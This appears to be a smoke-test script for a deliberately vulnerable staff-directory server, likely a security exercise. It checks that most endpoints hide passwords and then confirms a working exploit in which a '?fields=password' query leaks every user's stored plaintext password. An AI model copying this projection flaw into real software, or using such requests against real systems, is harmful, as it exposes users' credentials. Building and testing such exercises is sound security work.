// Smoke tests for the staff directory.
// Boots the server, hits each endpoint, and confirms the exploit works.

const { spawn } = require('child_process');
const path = require('path');

const PORT = 3999;
const base = `http://localhost:${PORT}`;

function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

async function get(url) {
  const r = await fetch(url);
  return { status: r.status, body: await r.json() };
}

async function postJSON(url, body) {
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  return { status: r.status, body: await r.json() };
}

function assert(cond, msg) {
  if (!cond) { console.error(`FAIL: ${msg}`); process.exitCode = 1; }
  else { console.log(`ok   ${msg}`); }
}

(async () => {
  const server = spawn('node', [path.join(__dirname, '..', 'server.js')], {
    env: { ...process.env, PORT: String(PORT) },
    stdio: ['ignore', 'pipe', 'inherit'],
  });
  server.stdout.on('data', d => process.stdout.write(`[server] ${d}`));

  try {
    // Give the server a beat to bind.
    for (let i = 0; i < 20; i++) {
      try { await fetch(base + '/api/users'); break; } catch { await wait(100); }
    }

    // 1. List endpoint hides passwords
    const list = await get(base + '/api/users');
    assert(list.status === 200, 'GET /api/users → 200');
    assert(Array.isArray(list.body) && list.body.length === 6, 'returns 6 users');
    assert(list.body.every(u => !('password' in u)), 'list hides password');

    // 2. Search endpoint hides passwords
    const search = await get(base + '/api/users/search?q=kittle');
    assert(search.body.length === 1, 'search finds kittle');
    assert(!('password' in search.body[0]), 'search hides password');

    // 3. Default single-user fetch hides password
    const one = await get(base + '/api/users/1');
    assert(!('password' in one.body), 'default /api/users/1 hides password');

    // 4. Login works for valid credentials
    const good = await postJSON(base + '/api/login', {
      username: 'gkittle85', password: 'BlockParty-85!Rumble',
    });
    assert(good.status === 200 && good.body.ok === true, 'valid login succeeds');
    assert(!('password' in good.body.user), 'login response hides password');

    const bad = await postJSON(base + '/api/login', {
      username: 'gkittle85', password: 'wrong',
    });
    assert(bad.status === 401, 'invalid login rejected');

    // 5. THE EXPLOIT — field projection leaks passwords
    const leak = await get(base + '/api/users/1?fields=username,password');
    assert(leak.status === 200, 'projection endpoint returns 200');
    assert(leak.body.password === 'BlockParty-85!Rumble',
           'EXPLOIT: ?fields=password leaks the password');

    // Works for every user
    const allLeaked = await Promise.all([1,2,3,4,5,6].map(
      id => get(`${base}/api/users/${id}?fields=password`)
    ));
    assert(allLeaked.every(r => typeof r.body.password === 'string'),
           'EXPLOIT: every user id leaks via ?fields=password');
  } finally {
    server.kill();
  }
})();
